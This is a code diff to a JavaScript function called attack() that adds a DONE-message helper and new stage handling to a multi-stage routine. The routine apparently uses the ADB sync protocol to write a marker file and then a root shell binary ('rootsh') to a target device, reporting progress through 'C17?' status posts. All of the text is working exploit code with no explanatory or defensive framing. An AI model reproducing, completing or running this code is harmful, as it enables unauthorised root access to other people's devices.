@@ -52,6 +52,12 @@ function attack() {
         b.write(payload, 8, 'ascii');
         syncWrite(b);
     }
+    function sendDone(next) {
+        var d = new Buffer(8);
+        d.write('DONE', 0, 'ascii');
+        d.writeUInt32LE(0, 4);
+        syncWrite(d);
+    }
     function go() {
         stage++;
         post('C17?stage=' + stage);
@@ -70,9 +76,11 @@ function attack() {
             inner = inner.slice(8 + slen);
             if (sc === 'OKAY') {
                 post('C17?OKAY[' + stage + '] len=' + slen);
-                if (stage === 1) { syncWrite(new Buffer('S17_MARKER')); }
+                if (stage === 1) { stage = 5; syncWrite(new Buffer('S17_MARKER')); sendDone(); }
                 else if (stage === 2) { go(); }
-                else if (stage === 3) { syncWrite(shBytes); post('C17?rootsh_sent=' + shBytes.length); }
+                else if (stage === 3) { stage = 4; syncWrite(shBytes); post('C17?rootsh_sent=' + shBytes.length); sendDone(); }
+                else if (stage === 4) { post('C17?rootsh_written'); finish('rootsh_written'); }
+                else if (stage === 5) { post('C17?marker_written'); go(); }
             } else if (sc === 'DATA' && stage === 2) {
                 recvBuf = Buffer.concat([recvBuf, data]);
             } else if (sc === 'DONE') {
